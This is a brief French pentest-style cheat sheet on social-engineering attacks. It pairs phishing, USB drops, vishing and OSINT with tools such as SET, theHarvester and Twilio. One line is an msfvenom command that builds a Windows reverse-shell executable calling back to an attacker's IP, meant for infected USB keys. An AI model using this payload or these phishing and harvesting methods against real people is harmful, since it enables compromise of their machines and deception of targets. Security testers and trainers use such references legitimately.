# Couche 8 – Ingénierie Sociale

## 1. Types d'attaques
- Phishing  : Piéger une cible pour obtenir des identifiants ou l’inciter à installer un malware.
- USB Drop  : Déposer des clés infectées pour inciter à leur branchement.
- Vishing  : Ingénierie sociale par téléphone.
- Collecte d’information (OSINT)  : Récolter des données publiques sur la cible.

## 2. Outils et méthodes

### ⚡ Attaque : Phishing

#### Outil : SET (Social Engineering Toolkit)
**Description** : Générateur d’attaques d’ingénierie sociale automatisées.
**Installation** : sudo apt install set
**Commande** : sudo setoolkit

---

### ⚡ Attaque : USB Drop

#### Outil : Metasploit
**Description** : Génère des payloads à déposer sur clé USB.
**Installation** : sudo apt install metasploit-framework
**Commande** : msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP Attaquant|192.168.1.1] LPORT=[port|4444] -f exe -o shell.exe

---

### ⚡ Attaque : Vishing

#### Outil : Twilio (API)
**Description** : Permet de simuler des appels ou des SMS automatisés.
**Installation** : https://www.twilio.com/
**Info** : Utilisation via scripts/API Python, voir documentation officielle.

---

### ⚡ Attaque : Collecte d’information (OSINT)

#### Outil : theHarvester
**Description** : Collecte des emails, noms, sous-domaines publics.
**Installation** : sudo apt install theharvester
**Commande** : theharvester -d [domaine cible|example.com] -b google,bing,linkedin
